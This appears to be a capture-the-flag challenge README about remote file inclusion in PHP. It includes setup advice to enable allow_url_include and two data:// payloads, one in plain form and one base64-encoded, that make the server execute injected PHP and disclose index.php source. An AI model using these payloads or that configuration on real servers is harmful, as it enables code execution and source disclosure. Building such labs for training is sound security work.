# Flag Locker

## Vulnerability: Remote file inclusion

## The flag is secure. Can you break it?

## Note to server admin

* Set allow_url_include On in apache2
* allow readonly to cuurent directory.. Disable all commands..

data:text/plain,<?php%20echo%20base64_encode(file_get_contents("index.php"));%20?>

data://text/plain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=
